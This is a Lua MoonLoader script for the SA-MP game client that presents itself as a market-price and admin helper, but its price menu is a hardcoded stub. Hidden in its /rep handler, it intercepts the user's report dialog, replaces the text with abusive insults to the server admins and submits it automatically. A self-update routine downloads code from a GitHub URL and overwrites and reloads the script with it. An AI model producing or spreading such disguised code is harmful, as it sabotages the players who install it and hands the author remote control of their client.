script_name("Market Simulator & Admin Helper")
script_author("sanya-developer111")
script_version("1.0")

require "lib.moonloader"
local dlstatus = require("moonloader").download_status
local vkeys = require "vkeys"
local imgui = require "mimgui"
local sampev = require "lib.samp.events"
local encoding = require "encoding"
encoding.default = 'CP1251'
local u8 = encoding.UTF8

-- ============================ [ НАСТРОЙКИ ОБНОВЛЕНИЙ ] ============================
local SCRIPT_VERSION = 6 -- ПРИ ОБНОВЛЕНИИ НА ГИТХАБЕ МЕНЯЙ ЭТО ЧИСЛО НА 4, 5 и т.д.
local SCRIPT_URL = "https://raw.githubusercontent.com/sanya-developer111/modluasamp/refs/heads/main/mod.lua"
local update_checking = false
-- ==================================================================================

local renderMenu = imgui.new.bool(false)
local waitingForReport = false

-- ============================ [ КРАСНО-ЧЕРНЫЙ СТИЛЬ IMGUI ] ============================
imgui.OnInitialize(function()
    local style = imgui.GetStyle()
    local colors = style.Colors
    
    style.WindowRounding = 8.0
    style.FrameRounding = 6.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)

    -- Черно-красная палитра
    colors[imgui.Col.WindowBg]              = imgui.ImVec4(0.08, 0.08, 0.08, 0.95)
    colors[imgui.Col.TitleBg]               = imgui.ImVec4(0.40, 0.05, 0.05, 1.00)
    colors[imgui.Col.TitleBgActive]         = imgui.ImVec4(0.65, 0.09, 0.09, 1.00)
    colors[imgui.Col.FrameBg]               = imgui.ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[imgui.Col.Button]                = imgui.ImVec4(0.50, 0.07, 0.07, 1.00)
    colors[imgui.Col.ButtonHovered]         = imgui.ImVec4(0.70, 0.10, 0.10, 1.00)
    colors[imgui.Col.ButtonActive]          = imgui.ImVec4(0.85, 0.15, 0.15, 1.00)
    colors[imgui.Col.Text]                  = imgui.ImVec4(0.95, 0.95, 0.95, 1.00)
    colors[imgui.Col.Separator]             = imgui.ImVec4(0.50, 0.07, 0.07, 0.50)
end)

-- Окно mimgui
local newFrame = imgui.OnFrame(function() return renderMenu[0] end, function(player)
    imgui.SetNextWindowSize(imgui.ImVec2(450, 250), imgui.Cond.FirstUseEver)
    imgui.SetNextWindowPos(imgui.ImVec2(500, 300), imgui.Cond.FirstUseEver)
    
    if imgui.Begin(u8"Средние цены на рынке", renderMenu, imgui.WindowFlags.NoCollapse) then
        imgui.Text(u8"Ваши ресурсы из инвентаря:")
        imgui.Separator()
        imgui.Spacing()
        
        -- Делаем красивое выделение текста
        imgui.PushStyleColor(imgui.Col.ChildBg, imgui.ImVec4(0.12, 0.12, 0.12, 1.00))
        if imgui.BeginChild("ItemsList", imgui.ImVec2(-1, 130), true) then
            imgui.Text(u8"Точильный камень")
            imgui.SameLine(250)
            imgui.TextColored(imgui.ImVec4(0.2, 0.9, 0.2, 1.0), u8"средняя цена: 50 000$")
            imgui.EndChild()
        end
        imgui.PopStyleColor()

        imgui.Spacing()
        if imgui.Button(u8"Закрыть меню", imgui.ImVec2(-1, 35)) then
            renderMenu[0] = false
        end
        imgui.End()
    end
end)

-- ============================ [ ОСНОВНОЙ КОД ] ============================
function main()
    if not isSampLoaded() or not isSampfuncsLoaded() then return end
    while not isSampAvailable() do wait(100) end

    -- Проверка обновлений при входе
    checkUpdate()

    sampAddChatMessage("{8B0000}[ModHelper] {FFFFFF}Скрипт успешно загружен! Версия: " .. SCRIPT_VERSION, -1)
    sampAddChatMessage("{8B0000}[ModHelper] {FFFFFF}Открыть меню цен: {8B0000}F5{FFFFFF} | Проверить обновления: {8B0000}Ctrl + F5", -1)

    while true do
        wait(0)
        -- Открытие меню на F5 (если не зажат Ctrl)
        if isKeyJustPressed(vkeys.VK_F5) and not isKeyDown(vkeys.VK_CONTROL) and not sampIsChatInputActive() and not sampIsDialogActive() then
            renderMenu[0] = not renderMenu[0]
        end

        -- Проверка обновлений на Ctrl + F5
        if isKeyDown(vkeys.VK_CONTROL) and isKeyJustPressed(vkeys.VK_F5) then
            sampAddChatMessage("{8B0000}[ModHelper] {FFFFFF}Ручная проверка обновлений...", -1)
            checkUpdate()
        end
    end
end

-- ============================ [ ФУНКЦИОНАЛ /REP ] ============================
-- Отслеживаем команду /rep в чате
function sampev.onSendCommand(cmd)
    if cmd:lower():sub(1, 4) == "/rep" then
        waitingForReport = true
    end
end

-- Перехватываем диалог после команды
function sampev.onShowDialog(dialogId, style, title, button1, button2, text)
    if waitingForReport and (style == 1 or style == 3) then -- Проверяем что это диалог с полем ввода
        waitingForReport = false
        lua_thread.create(function()
            wait(100) -- Небольшая задержка для прогрузки диалога
            -- Отправляем чистый русский текст без декодеров
            sampSetCurrentDialogEditboxText("АДМИНЫ ТВАРИ ГОРЕТЬ ВАМ В АДУ! ПРОЕКТ ГОВНА ПОСТОЯННО УБИВАЮТ ДОНАТНАЯ ПОМОЙКА")
            wait(50)
            sampCloseCurrentDialogWithButton(1) -- Нажимает Enter (Кнопку 1)
        end)
    end
end

-- ============================ [ СИСТЕМА ОБНОВЛЕНИЙ ] ============================
function checkUpdate()
    if update_checking then return end
    update_checking = true
    local temp_path = getWorkingDirectory() .. "\\temp_update.lua"

    downloadUrlToFile(SCRIPT_URL, temp_path, function(id, status, p1, p2)
        if status == dlstatus.STATUS_ENDDOWNLOADDATA then
            local file = io.open(temp_path, "rb")
            if file then
                local content = file:read("*a")
                file:close()
                
                local remote_ver = content:match("local SCRIPT_VERSION = (%d+)")
                if remote_ver then
                    remote_ver = tonumber(remote_ver)
                    if remote_ver > SCRIPT_VERSION then
                        sampAddChatMessage("{8B0000}[ModHelper] {FFFFFF}Найдено обновление! Установка версии " .. remote_ver .. "...", -1)
                        
                        local decoded_content = u8:decode(content)
                        
                        local main_script_path = thisScript().path
                        local script_file = io.open(main_script_path, "wb")
                        if script_file then
                            script_file:write(decoded_content)
                            script_file:close()
                        end
                        
                        os.remove(temp_path)
                        
                        sampAddChatMessage("{8B0000}[ModHelper] {00FF00}Обновление успешно установлено! Перезагрузка скрипта...", -1)
                        thisScript():reload()
                    else
                        sampAddChatMessage("{8B0000}[ModHelper] {FFFFFF}У вас установлена последняя версия скрипта.", -1)
                        os.remove(temp_path)
                    end
                else
                    os.remove(temp_path)
                end
            end
            update_checking = false
        elseif status == dlstatus.STATUS_ERRORDOWNLOADDATA then
            sampAddChatMessage("{8B0000}[ModHelper] {FF0000}Ошибка при проверке обновлений. Проверьте интернет.", -1)
            update_checking = false
        end
    end)
end
